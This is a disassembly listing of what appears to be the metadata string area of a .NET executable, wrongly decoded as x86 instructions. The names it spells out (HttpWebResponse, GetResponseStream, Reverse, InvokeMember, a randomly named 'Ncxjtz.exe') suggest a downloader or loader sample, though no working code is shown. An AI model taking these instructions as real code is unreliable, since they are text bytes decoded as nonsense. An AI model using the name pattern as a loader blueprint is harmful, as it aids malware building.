  402c04:	79 70                	jns    0x402c76
  402c06:	65 48                	gs dec %eax
  402c08:	61                   	popa
  402c09:	6e                   	outsb  %ds:(%esi),(%dx)
  402c0a:	64 6c                	fs insb (%dx),%es:(%edi)
  402c0c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402c10:	74 54                	je     0x402c66
  402c12:	79 70                	jns    0x402c84
  402c14:	65 46                	gs inc %esi
  402c16:	72 6f                	jb     0x402c87
  402c18:	6d                   	insl   (%dx),%es:(%edi)
  402c19:	48                   	dec    %eax
  402c1a:	61                   	popa
  402c1b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c1c:	64 6c                	fs insb (%dx),%es:(%edi)
  402c1e:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  402c22:	74 5f                	je     0x402c83
  402c24:	57                   	push   %edi
  402c25:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  402c2c:	79 6c                	jns    0x402c9a
  402c2e:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  402c32:	6f                   	outsl  %ds:(%esi),(%dx)
  402c33:	63 65 73             	arpl   %esp,0x73(%ebp)
  402c36:	73 57                	jae    0x402c8f
  402c38:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  402c3f:	79 6c                	jns    0x402cad
  402c41:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402c45:	74 5f                	je     0x402ca6
  402c47:	4e                   	dec    %esi
  402c48:	61                   	popa
  402c49:	6d                   	insl   (%dx),%es:(%edi)
  402c4a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  402c4e:	74 5f                	je     0x402caf
  402c50:	4e                   	dec    %esi
  402c51:	61                   	popa
  402c52:	6d                   	insl   (%dx),%es:(%edi)
  402c53:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  402c57:	74 5f                	je     0x402cb8
  402c59:	46                   	inc    %esi
  402c5a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  402c61:	00 
  402c62:	67 65 74 5f          	addr16 gs je 0x402cc5
  402c66:	46                   	inc    %esi
  402c67:	75 6c                	jne    0x402cd5
  402c69:	6c                   	insb   (%dx),%es:(%edi)
  402c6a:	4e                   	dec    %esi
  402c6b:	61                   	popa
  402c6c:	6d                   	insl   (%dx),%es:(%edi)
  402c6d:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  402c71:	63 75 72             	arpl   %esi,0x72(%ebp)
  402c74:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  402c7b:	6f 
  402c7c:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  402c7f:	54                   	push   %esp
  402c80:	79 70                	jns    0x402cf2
  402c82:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402c86:	73 74                	jae    0x402cfc
  402c88:	65 6d                	gs insl (%dx),%es:(%edi)
  402c8a:	2e 43                	cs inc %ebx
  402c8c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8d:	72 65                	jb     0x402cf4
  402c8f:	00 67 65             	add    %ah,0x65(%edi)
  402c92:	74 5f                	je     0x402cf3
  402c94:	43                   	inc    %ebx
  402c95:	75 6c                	jne    0x402d03
  402c97:	74 75                	je     0x402d0e
  402c99:	72 65                	jb     0x402d00
  402c9b:	00 73 65             	add    %dh,0x65(%ebx)
  402c9e:	74 5f                	je     0x402cff
  402ca0:	43                   	inc    %ebx
  402ca1:	75 6c                	jne    0x402d0f
  402ca3:	74 75                	je     0x402d1a
  402ca5:	72 65                	jb     0x402d0c
  402ca7:	00 72 65             	add    %dh,0x65(%edx)
  402caa:	73 6f                	jae    0x402d1b
  402cac:	75 72                	jne    0x402d20
  402cae:	63 65 43             	arpl   %esp,0x43(%ebp)
  402cb1:	75 6c                	jne    0x402d1f
  402cb3:	74 75                	je     0x402d2a
  402cb5:	72 65                	jb     0x402d1c
  402cb7:	00 41 70             	add    %al,0x70(%ecx)
  402cba:	70 6c                	jo     0x402d28
  402cbc:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402cc3:	53                   	push   %ebx
  402cc4:	65 74 74             	gs je  0x402d3b
  402cc7:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  402cce:	65 00 48 74          	add    %cl,%gs:0x74(%eax)
  402cd2:	74 70                	je     0x402d44
  402cd4:	57                   	push   %edi
  402cd5:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  402cd9:	73 70                	jae    0x402d4b
  402cdb:	6f                   	outsl  %ds:(%esi),(%dx)
  402cdc:	6e                   	outsb  %ds:(%esi),(%dx)
  402cdd:	73 65                	jae    0x402d44
  402cdf:	00 47 65             	add    %al,0x65(%edi)
  402ce2:	74 52                	je     0x402d36
  402ce4:	65 73 70             	gs jae 0x402d57
  402ce7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ce9:	73 65                	jae    0x402d50
  402ceb:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402cef:	70 6f                	jo     0x402d60
  402cf1:	73 65                	jae    0x402d58
  402cf3:	00 52 65             	add    %dl,0x65(%edx)
  402cf6:	76 65                	jbe    0x402d5d
  402cf8:	72 73                	jb     0x402d6d
  402cfa:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  402cfe:	65 61                	gs popa
  402d00:	74 65                	je     0x402d67
  402d02:	00 45 64             	add    %al,0x64(%ebp)
  402d05:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  402d0c:	77 
  402d0d:	73 61                	jae    0x402d70
  402d0f:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  402d13:	74 61                	je     0x402d76
  402d15:	74 65                	je     0x402d7c
  402d17:	00 73 69             	add    %dh,0x69(%ebx)
  402d1a:	74 65                	je     0x402d81
  402d1c:	00 53 54             	add    %dl,0x54(%ebx)
  402d1f:	41                   	inc    %ecx
  402d20:	54                   	push   %esp
  402d21:	68 72 65 61 64       	push   $0x64616572
  402d26:	41                   	inc    %ecx
  402d27:	74 74                	je     0x402d9d
  402d29:	72 69                	jb     0x402d94
  402d2b:	62 75 74             	bound  %esi,0x74(%ebp)
  402d2e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402d32:	6d                   	insl   (%dx),%es:(%edi)
  402d33:	70 69                	jo     0x402d9e
  402d35:	6c                   	insb   (%dx),%es:(%edi)
  402d36:	65 72 47             	gs jb  0x402d80
  402d39:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d3b:	65 72 61             	gs jb  0x402d9f
  402d3e:	74 65                	je     0x402da5
  402d40:	64 41                	fs inc %ecx
  402d42:	74 74                	je     0x402db8
  402d44:	72 69                	jb     0x402daf
  402d46:	62 75 74             	bound  %esi,0x74(%ebp)
  402d49:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402d4d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402d54:	62 
  402d55:	75 74                	jne    0x402dcb
  402d57:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402d5c:	65 72 61             	gs jb  0x402dc0
  402d5f:	74 65                	je     0x402dc6
  402d61:	64 43                	fs inc %ebx
  402d63:	6f                   	outsl  %ds:(%esi),(%dx)
  402d64:	64 65 41             	fs gs inc %ecx
  402d67:	74 74                	je     0x402ddd
  402d69:	72 69                	jb     0x402dd4
  402d6b:	62 75 74             	bound  %esi,0x74(%ebp)
  402d6e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402d73:	75 67                	jne    0x402ddc
  402d75:	67 65 72 4e          	addr16 gs jb 0x402dc7
  402d79:	6f                   	outsl  %ds:(%esi),(%dx)
  402d7a:	6e                   	outsb  %ds:(%esi),(%dx)
  402d7b:	55                   	push   %ebp
  402d7c:	73 65                	jae    0x402de3
  402d7e:	72 43                	jb     0x402dc3
  402d80:	6f                   	outsl  %ds:(%esi),(%dx)
  402d81:	64 65 41             	fs gs inc %ecx
  402d84:	74 74                	je     0x402dfa
  402d86:	72 69                	jb     0x402df1
  402d88:	62 75 74             	bound  %esi,0x74(%ebp)
  402d8b:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402d90:	75 67                	jne    0x402df9
  402d92:	67 61                	addr16 popa
  402d94:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402d98:	74 74                	je     0x402e0e
  402d9a:	72 69                	jb     0x402e05
  402d9c:	62 75 74             	bound  %esi,0x74(%ebp)
  402d9f:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  402da3:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  402daa:	77 
  402dab:	73 61                	jae    0x402e0e
  402dad:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402db1:	74 74                	je     0x402e27
  402db3:	72 69                	jb     0x402e1e
  402db5:	62 75 74             	bound  %esi,0x74(%ebp)
  402db8:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402dbc:	6d                   	insl   (%dx),%es:(%edi)
  402dbd:	56                   	push   %esi
  402dbe:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402dc5:	74 74                	je     0x402e3b
  402dc7:	72 69                	jb     0x402e32
  402dc9:	62 75 74             	bound  %esi,0x74(%ebp)
  402dcc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402dd0:	73 65                	jae    0x402e37
  402dd2:	6d                   	insl   (%dx),%es:(%edi)
  402dd3:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402dd7:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402dde:	72 
  402ddf:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402de6:	73 73                	jae    0x402e5b
  402de8:	65 6d                	gs insl (%dx),%es:(%edi)
  402dea:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402dee:	72 61                	jb     0x402e51
  402df0:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402df3:	61                   	popa
  402df4:	72 6b                	jb     0x402e61
  402df6:	41                   	inc    %ecx
  402df7:	74 74                	je     0x402e6d
  402df9:	72 69                	jb     0x402e64
  402dfb:	62 75 74             	bound  %esi,0x74(%ebp)
  402dfe:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402e03:	67 65 74 46          	addr16 gs je 0x402e4d
  402e07:	72 61                	jb     0x402e6a
  402e09:	6d                   	insl   (%dx),%es:(%edi)
  402e0a:	65 77 6f             	gs ja  0x402e7c
  402e0d:	72 6b                	jb     0x402e7a
  402e0f:	41                   	inc    %ecx
  402e10:	74 74                	je     0x402e86
  402e12:	72 69                	jb     0x402e7d
  402e14:	62 75 74             	bound  %esi,0x74(%ebp)
  402e17:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e1b:	73 65                	jae    0x402e82
  402e1d:	6d                   	insl   (%dx),%es:(%edi)
  402e1e:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402e22:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402e29:	69 
  402e2a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e2b:	6e                   	outsb  %ds:(%esi),(%dx)
  402e2c:	41                   	inc    %ecx
  402e2d:	74 74                	je     0x402ea3
  402e2f:	72 69                	jb     0x402e9a
  402e31:	62 75 74             	bound  %esi,0x74(%ebp)
  402e34:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e38:	73 65                	jae    0x402e9f
  402e3a:	6d                   	insl   (%dx),%es:(%edi)
  402e3b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402e3f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e40:	6e                   	outsb  %ds:(%esi),(%dx)
  402e41:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402e47:	74 69                	je     0x402eb2
  402e49:	6f                   	outsl  %ds:(%esi),(%dx)
  402e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  402e4b:	41                   	inc    %ecx
  402e4c:	74 74                	je     0x402ec2
  402e4e:	72 69                	jb     0x402eb9
  402e50:	62 75 74             	bound  %esi,0x74(%ebp)
  402e53:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e57:	73 65                	jae    0x402ebe
  402e59:	6d                   	insl   (%dx),%es:(%edi)
  402e5a:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402e5e:	65 73 63             	gs jae 0x402ec4
  402e61:	72 69                	jb     0x402ecc
  402e63:	70 74                	jo     0x402ed9
  402e65:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402e6c:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402e73:	6f                   	outsl  %ds:(%esi),(%dx)
  402e74:	6d                   	insl   (%dx),%es:(%edi)
  402e75:	70 69                	jo     0x402ee0
  402e77:	6c                   	insb   (%dx),%es:(%edi)
  402e78:	61                   	popa
  402e79:	74 69                	je     0x402ee4
  402e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e7c:	6e                   	outsb  %ds:(%esi),(%dx)
  402e7d:	52                   	push   %edx
  402e7e:	65 6c                	gs insb (%dx),%es:(%edi)
  402e80:	61                   	popa
  402e81:	78 61                	js     0x402ee4
  402e83:	74 69                	je     0x402eee
  402e85:	6f                   	outsl  %ds:(%esi),(%dx)
  402e86:	6e                   	outsb  %ds:(%esi),(%dx)
  402e87:	73 41                	jae    0x402eca
  402e89:	74 74                	je     0x402eff
  402e8b:	72 69                	jb     0x402ef6
  402e8d:	62 75 74             	bound  %esi,0x74(%ebp)
  402e90:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e94:	73 65                	jae    0x402efb
  402e96:	6d                   	insl   (%dx),%es:(%edi)
  402e97:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402e9b:	72 6f                	jb     0x402f0c
  402e9d:	64 75 63             	fs jne 0x402f03
  402ea0:	74 41                	je     0x402ee3
  402ea2:	74 74                	je     0x402f18
  402ea4:	72 69                	jb     0x402f0f
  402ea6:	62 75 74             	bound  %esi,0x74(%ebp)
  402ea9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ead:	73 65                	jae    0x402f14
  402eaf:	6d                   	insl   (%dx),%es:(%edi)
  402eb0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb5:	70 79                	jo     0x402f30
  402eb7:	72 69                	jb     0x402f22
  402eb9:	67 68 74 41 74 74    	addr16 push $0x74744174
  402ebf:	72 69                	jb     0x402f2a
  402ec1:	62 75 74             	bound  %esi,0x74(%ebp)
  402ec4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ec8:	73 65                	jae    0x402f2f
  402eca:	6d                   	insl   (%dx),%es:(%edi)
  402ecb:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ecf:	6f                   	outsl  %ds:(%esi),(%dx)
  402ed0:	6d                   	insl   (%dx),%es:(%edi)
  402ed1:	70 61                	jo     0x402f34
  402ed3:	6e                   	outsb  %ds:(%esi),(%dx)
  402ed4:	79 41                	jns    0x402f17
  402ed6:	74 74                	je     0x402f4c
  402ed8:	72 69                	jb     0x402f43
  402eda:	62 75 74             	bound  %esi,0x74(%ebp)
  402edd:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402ee1:	6e                   	outsb  %ds:(%esi),(%dx)
  402ee2:	74 69                	je     0x402f4d
  402ee4:	6d                   	insl   (%dx),%es:(%edi)
  402ee5:	65 43                	gs inc %ebx
  402ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ee8:	6d                   	insl   (%dx),%es:(%edi)
  402ee9:	70 61                	jo     0x402f4c
  402eeb:	74 69                	je     0x402f56
  402eed:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402ef0:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402ef7:	69 
  402ef8:	62 75 74             	bound  %esi,0x74(%ebp)
  402efb:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  402eff:	6c                   	insb   (%dx),%es:(%edi)
  402f00:	75 65                	jne    0x402f67
  402f02:	00 4e 63             	add    %cl,0x63(%esi)
  402f05:	78 6a                	js     0x402f71
  402f07:	74 7a                	je     0x402f83
  402f09:	2e 65 78 65          	cs js,pn 0x402f72
  402f0d:	00 73 65             	add    %dh,0x65(%ebx)
  402f10:	74 5f                	je     0x402f71
  402f12:	43                   	inc    %ebx
  402f13:	6c                   	insb   (%dx),%es:(%edi)
  402f14:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  402f1b:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402f1f:	73 74                	jae    0x402f95
  402f21:	65 6d                	gs insl (%dx),%es:(%edi)
  402f23:	2e 52                	cs push %edx
  402f25:	75 6e                	jne    0x402f95
  402f27:	74 69                	je     0x402f92
  402f29:	6d                   	insl   (%dx),%es:(%edi)
  402f2a:	65 2e 56             	gs cs push %esi
  402f2d:	65 72 73             	gs jb  0x402fa3
  402f30:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402f37:	53                   	push   %ebx
  402f38:	74 72                	je     0x402fac
  402f3a:	69 6e 67 00 64 69 73 	imul   $0x73696400,0x67(%esi),%ebp
  402f41:	70 6f                	jo     0x402fb2
  402f43:	73 69                	jae    0x402fae
  402f45:	6e                   	outsb  %ds:(%esi),(%dx)
  402f46:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  402f4a:	73 74                	jae    0x402fc0
  402f4c:	65 6d                	gs insl (%dx),%es:(%edi)
  402f4e:	2e 44                	cs inc %esp
  402f50:	72 61                	jb     0x402fb3
  402f52:	77 69                	ja     0x402fbd
  402f54:	6e                   	outsb  %ds:(%esi),(%dx)
  402f55:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  402f59:	73 74                	jae    0x402fcf
  402f5b:	65 6d                	gs insl (%dx),%es:(%edi)
  402f5d:	2e 43                	cs inc %ebx
  402f5f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f60:	6d                   	insl   (%dx),%es:(%edi)
  402f61:	70 6f                	jo     0x402fd2
  402f63:	6e                   	outsb  %ds:(%esi),(%dx)
  402f64:	65 6e                	outsb  %gs:(%esi),(%dx)
  402f66:	74 4d                	je     0x402fb5
  402f68:	6f                   	outsl  %ds:(%esi),(%dx)
  402f69:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  402f6c:	00 73 65             	add    %dh,0x65(%ebx)
  402f6f:	74 5f                	je     0x402fd0
  402f71:	53                   	push   %ebx
  402f72:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  402f76:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%ecx,%edi,2),%esi
  402f7d:	6f 
  402f7e:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  402f81:	00 43 6f             	add    %al,0x6f(%ebx)
  402f84:	6e                   	outsb  %ds:(%esi),(%dx)
  402f85:	74 61                	je     0x402fe8
  402f87:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  402f8e:	74 72                	je     0x403002
  402f90:	6f                   	outsl  %ds:(%esi),(%dx)
  402f91:	6c                   	insb   (%dx),%es:(%edi)
  402f92:	00 75 72             	add    %dh,0x72(%ebp)
  402f95:	6c                   	insb   (%dx),%es:(%edi)
  402f96:	00 47 65             	add    %al,0x65(%edi)
  402f99:	74 52                	je     0x402fed
  402f9b:	65 73 70             	gs jae 0x40300e
  402f9e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f9f:	6e                   	outsb  %ds:(%esi),(%dx)
  402fa0:	73 65                	jae    0x403007
  402fa2:	53                   	push   %ebx
  402fa3:	74 72                	je     0x403017
  402fa5:	65 61                	gs popa
  402fa7:	6d                   	insl   (%dx),%es:(%edi)
  402fa8:	00 4d 65             	add    %cl,0x65(%ebp)
  402fab:	6d                   	insl   (%dx),%es:(%edi)
  402fac:	6f                   	outsl  %ds:(%esi),(%dx)
  402fad:	72 79                	jb     0x403028
  402faf:	53                   	push   %ebx
  402fb0:	74 72                	je     0x403024
  402fb2:	65 61                	gs popa
  402fb4:	6d                   	insl   (%dx),%es:(%edi)
  402fb5:	00 50 72             	add    %dl,0x72(%eax)
  402fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb9:	67 72 61             	addr16 jb 0x40301d
  402fbc:	6d                   	insl   (%dx),%es:(%edi)
  402fbd:	00 53 79             	add    %dl,0x79(%ebx)
  402fc0:	73 74                	jae    0x403036
  402fc2:	65 6d                	gs insl (%dx),%es:(%edi)
  402fc4:	00 46 6f             	add    %al,0x6f(%esi)
  402fc7:	72 6d                	jb     0x403036
  402fc9:	00 72 65             	add    %dh,0x65(%edx)
  402fcc:	73 6f                	jae    0x40303d
  402fce:	75 72                	jne    0x403042
  402fd0:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  402fd3:	61                   	popa
  402fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  402fd5:	00 4d 61             	add    %cl,0x61(%ebp)
  402fd8:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402fdf:	65 6d                	gs insl (%dx),%es:(%edi)
  402fe1:	2e 43                	cs inc %ebx
  402fe3:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe4:	6e                   	outsb  %ds:(%esi),(%dx)
  402fe5:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402feb:	74 69                	je     0x403056
  402fed:	6f                   	outsl  %ds:(%esi),(%dx)
  402fee:	6e                   	outsb  %ds:(%esi),(%dx)
  402fef:	00 53 79             	add    %dl,0x79(%ebx)
  402ff2:	73 74                	jae    0x403068
  402ff4:	65 6d                	gs insl (%dx),%es:(%edi)
  402ff6:	2e 47                	cs inc %edi
  402ff8:	6c                   	insb   (%dx),%es:(%edi)
  402ff9:	6f                   	outsl  %ds:(%esi),(%dx)
  402ffa:	62 61 6c             	bound  %esp,0x6c(%ecx)
  402ffd:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  403004:	00 53 79             	add    %dl,0x79(%ebx)
  403007:	73 74                	jae    0x40307d
  403009:	65 6d                	gs insl (%dx),%es:(%edi)
  40300b:	2e 52                	cs push %edx
  40300d:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  403010:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403015:	6e                   	outsb  %ds:(%esi),(%dx)
  403016:	00 45 78             	add    %al,0x78(%ebp)
  403019:	63 65 70             	arpl   %esp,0x70(%ebp)
  40301c:	74 69                	je     0x403087
  40301e:	6f                   	outsl  %ds:(%esi),(%dx)
  40301f:	6e                   	outsb  %ds:(%esi),(%dx)
  403020:	00 42 75             	add    %al,0x75(%edx)
  403023:	74 74                	je     0x403099
  403025:	6f                   	outsl  %ds:(%esi),(%dx)
  403026:	6e                   	outsb  %ds:(%esi),(%dx)
  403027:	00 43 6f             	add    %al,0x6f(%ebx)
  40302a:	70 79                	jo     0x4030a5
  40302c:	54                   	push   %esp
  40302d:	6f                   	outsl  %ds:(%esi),(%dx)
  40302e:	00 4d 65             	add    %cl,0x65(%ebp)
  403031:	74 68                	je     0x40309b
  403033:	6f                   	outsl  %ds:(%esi),(%dx)
  403034:	64 49                	fs dec %ecx
  403036:	6e                   	outsb  %ds:(%esi),(%dx)
  403037:	66 6f                	outsw  %ds:(%esi),(%dx)
  403039:	00 43 75             	add    %al,0x75(%ebx)
  40303c:	6c                   	insb   (%dx),%es:(%edi)
  40303d:	74 75                	je     0x4030b4
  40303f:	72 65                	jb     0x4030a6
  403041:	49                   	dec    %ecx
  403042:	6e                   	outsb  %ds:(%esi),(%dx)
  403043:	66 6f                	outsw  %ds:(%esi),(%dx)
  403045:	00 4d 65             	add    %cl,0x65(%ebp)
  403048:	6d                   	insl   (%dx),%es:(%edi)
  403049:	62 65 72             	bound  %esp,0x72(%ebp)
  40304c:	49                   	dec    %ecx
  40304d:	6e                   	outsb  %ds:(%esi),(%dx)
  40304e:	66 6f                	outsw  %ds:(%esi),(%dx)
  403050:	00 67 65             	add    %ah,0x65(%edi)
  403053:	74 5f                	je     0x4030b4
  403055:	53                   	push   %ebx
  403056:	74 61                	je     0x4030b9
  403058:	72 74                	jb     0x4030ce
  40305a:	49                   	dec    %ecx
  40305b:	6e                   	outsb  %ds:(%esi),(%dx)
  40305c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40305e:	00 50 72             	add    %dl,0x72(%eax)
  403061:	6f                   	outsl  %ds:(%esi),(%dx)
  403062:	63 65 73             	arpl   %esp,0x73(%ebp)
  403065:	73 53                	jae    0x4030ba
  403067:	74 61                	je     0x4030ca
  403069:	72 74                	jb     0x4030df
  40306b:	49                   	dec    %ecx
  40306c:	6e                   	outsb  %ds:(%esi),(%dx)
  40306d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40306f:	00 53 79             	add    %dl,0x79(%ebx)
  403072:	73 74                	jae    0x4030e8
  403074:	65 6d                	gs insl (%dx),%es:(%edi)
  403076:	2e 4c                	cs dec %esp
  403078:	69 6e 71 00 49 6e 76 	imul   $0x766e4900,0x71(%esi),%ebp
  40307f:	6f                   	outsl  %ds:(%esi),(%dx)
  403080:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  403084:	6d                   	insl   (%dx),%es:(%edi)
  403085:	62 65 72             	bound  %esp,0x72(%ebp)
  403088:	00 42 69             	add    %al,0x69(%edx)
  40308b:	6e                   	outsb  %ds:(%esi),(%dx)
  40308c:	64 65 72 00          	fs gs jb 0x403090
  403090:	62 75 66             	bound  %esi,0x66(%ebp)
  403093:	66 65 72 00          	data16 gs jb 0x403097
  403097:	67 65 74 5f          	addr16 gs je 0x4030fa
  40309b:	52                   	push   %edx
  40309c:	65 73 6f             	gs jae 0x40310e
  40309f:	75 72                	jne    0x403113
  4030a1:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  4030a4:	61                   	popa
  4030a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4030a6:	61                   	popa
  4030a7:	67 65 72 00          	addr16 gs jb 0x4030ab
  4030ab:	53                   	push   %ebx
  4030ac:	65 72 76             	gs jb  0x403125
  4030af:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%ebx),%esp
  4030b6:	74 4d                	je     0x403105
  4030b8:	61                   	popa
  4030b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4030ba:	61                   	popa
  4030bb:	67 65 72 00          	addr16 gs jb 0x4030bf
  4030bf:	53                   	push   %ebx
  4030c0:	79 73                	jns    0x403135
  4030c2:	74 65                	je     0x403129
  4030c4:	6d                   	insl   (%dx),%es:(%edi)
  4030c5:	2e 43                	cs inc %ebx
  4030c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c8:	64 65 44             	fs gs inc %esp
  4030cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cc:	6d                   	insl   (%dx),%es:(%edi)
  4030cd:	2e 43                	cs inc %ebx
  4030cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d0:	6d                   	insl   (%dx),%es:(%edi)
  4030d1:	70 69                	jo     0x40313c
  4030d3:	6c                   	insb   (%dx),%es:(%edi)
  4030d4:	65 72 00             	gs jb  0x4030d7
  4030d7:	49                   	dec    %ecx
  4030d8:	43                   	inc    %ebx
  4030d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4030da:	6e                   	outsb  %ds:(%esi),(%dx)
  4030db:	74 61                	je     0x40313e
  4030dd:	69 6e 65 72 00 2e 63 	imul   $0x632e0072,0x65(%esi),%ebp
  4030e4:	74 6f                	je     0x403155
  4030e6:	72 00                	jb     0x4030e8
  4030e8:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  4030ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ed:	72 00                	jb     0x4030ef
  4030ef:	53                   	push   %ebx
  4030f0:	79 73                	jns    0x403165
  4030f2:	74 65                	je     0x403159
  4030f4:	6d                   	insl   (%dx),%es:(%edi)
  4030f5:	2e 44                	cs inc %esp
  4030f7:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4030fe:	69 63 73 00 47 65 74 	imul   $0x74654700,0x73(%ebx),%esp
  403105:	4d                   	dec    %ebp
  403106:	65 74 68             	gs je  0x403171
  403109:	6f                   	outsl  %ds:(%esi),(%dx)
  40310a:	64 73 00             	fs jae 0x40310d
  40310d:	53                   	push   %ebx
  40310e:	79 73                	jns    0x403183
  403110:	74 65                	je     0x403177
  403112:	6d                   	insl   (%dx),%es:(%edi)
  403113:	2e 52                	cs push %edx
  403115:	75 6e                	jne    0x403185
  403117:	74 69                	je     0x403182
  403119:	6d                   	insl   (%dx),%es:(%edi)
  40311a:	65 2e 49             	gs cs dec %ecx
  40311d:	6e                   	outsb  %ds:(%esi),(%dx)
  40311e:	74 65                	je     0x403185
  403120:	72 6f                	jb     0x403191
  403122:	70 53                	jo     0x403177
  403124:	65 72 76             	gs jb  0x40319d
